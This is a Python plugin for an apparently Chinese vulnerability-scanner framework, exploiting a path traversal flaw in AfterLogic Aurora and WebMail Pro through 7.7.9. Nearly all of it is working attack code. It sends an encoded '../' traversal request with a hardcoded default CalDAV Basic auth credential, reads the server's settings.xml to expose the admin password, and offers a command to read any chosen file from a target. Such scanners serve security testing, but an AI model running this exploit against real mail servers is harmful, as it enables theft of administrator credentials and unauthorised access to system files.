# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Aurora 路径遍历漏洞",
        "description": "Afterlogic Aurora是美国Afterlogic公司的一套使用PHP语言编写的企业邮件服务器平台。该平台包括电子邮箱、文件存储和地址簿管理等功能。AfterLogic Aurora through 7.7.9 and WebMail Pro through 7.7.9 存在路径遍历漏洞，该漏洞允许通过目录遍历读取文件。",
        "references": ["http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202103-536"],
    }

    def url(self) -> dict:
        res = self.read_file(self.target.value, '/data/settings/settings.xml')
        if "AdminPassword" in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='读取系统文件')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("file", help="读取的文件", default="/data/settings/settings.xml")
    def read_file(self, url, file):
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(url, f'./dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e{file}'),
            headers={
                "Authorization": "Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI=",
                "User-Agent": "It doesnt matter",
                "Accept": "*/*",
                "Connection": "close"
            }
        )
        if r.status_code == 200:
            return r.text
